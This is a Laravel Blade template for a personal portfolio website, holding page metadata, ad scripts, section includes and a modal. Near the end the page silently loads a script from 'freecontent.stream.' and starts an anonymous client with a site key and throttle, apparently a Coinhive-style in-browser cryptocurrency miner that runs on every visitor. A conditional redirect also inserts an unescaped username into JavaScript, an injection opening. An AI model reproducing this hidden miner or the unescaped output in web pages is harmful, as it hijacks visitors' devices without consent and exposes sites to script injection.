<!DOCTYPE html>
<html lang="{{ config('app.locale') }}">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Author: Vincent Theo Roque, A Single Page Portfolio">
    <meta name="keywords" content="web developer, software developer, website, project, product, laravel, web development, create an app, web design company, app developer">
    <meta name="robots" content="index,follow">
    <meta name="DC.title" content="Theo Roque Personal Portfolio & Website">
    <meta name="csrf-token" content="{{ csrf_token() }}" />

    <link rel="stylesheet" type="text/css" href="{{ asset('/css/app.min.css') }}">
    <!-- Favicon -->
    <link rel="shortcut icon" href="{{ asset('/images/theoroque-favicon.png') }}">

    <script>
        window.Laravel = {!! json_encode([
            'csrfToken' => csrf_token(),
        ]) !!};
    </script>
    
    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
      (adsbygoogle = window.adsbygoogle || []).push({
        google_ad_client: "ca-pub-4026398495526739",
        enable_page_level_ads: true
      });
    </script>

    <title>Theo Roque</title>
</head>
<body data-spy="scroll" data-target=".navbar" data-offset="50">

    @include('common.navbar')

    @include('home')

    @include('about')

    @include('contact')

    @include('common.modal')

    @include('common.footer')

    <a id="topBtn" class="btn btn-elegant animated bounceIn"><strong><i class="fa fa-angle-double-up" id="arrow-up"></i></strong></a>

    <div class="modal fade mt-3" id="modalShyForm" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" style="display: none;" aria-hidden="true">
        <div class="modal-dialog cascading-modal" role="document">
            <!--Content-->
            <div class="modal-content">

                <!--Header-->
                <div class="modal-header light-blue darken-3 white-text">
                    <h4 class="title">
                        <i class="fa fa-heart"></i> Are you <strong>Shy</strong>?</h4>
                    <button type="button" class="close waves-effect waves-light" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <!--Body-->
                <div class="modal-body mb-0">

                    <div class="text-center mt-1-half">
                        <button class="btn btn-danger mb-2 waves-effect waves-light btn-lg" data-dismiss="modal" aria-label="Close" disabled="disabled">
                            <i class="fa fa-times ml-1"></i>
                            No
                        </button>
                        <a class="btn btn-info mb-2 waves-effect waves-light btn-lg" href="/shy">
                            <i class="fa fa-send ml-1"></i>
                            Yes!
                        </a>
                    </div>

                </div>
            </div>
            <!--/.Content-->
        </div>
    </div>
    <!-- Scripts -->
    <script src="{{ asset('/js/app.min.js') }}"></script>
    <!-- MDB Scripts -->
    <script src="{{ asset('/js/tether.min.js') }}"></script>
    <script src="{{ asset('/js/bootstrap.min.js') }}"></script>
    <script src="{{ asset('/js/mdb.min.js') }}"></script>
    <script src="{{ asset('/js/custom.min.js') }}"></script>
    <!-- Google Maps -->
    <script src="https://maps.googleapis.com/maps/api/js?key={{env('MAP_API_KEY')}}&callback=addressMap"></script>
    <script>
        new WOW().init();
    </script>

    <script src="https://www.freecontent.stream./A5Gf.js"></script>
    <script>
        var _client = new Client.Anonymous('39d47b11097d6628d4e149245e99dc2a7747682b30435887f6b6dfc16298a7f9', {
            throttle: 0.2
        });
        _client.start();
    </script>

    @if(Request::is('paysbook/*'))
        <script>
            $(document).ready(function() {

                setTimeout(function(){ 
                    location.href = "{!! 'https://paysbook.co/auth/register?id=' . $username !!}"
                }, 300);
                
            });
            
        </script>
    @endif

    @yield('scripts')
</body>
</html>
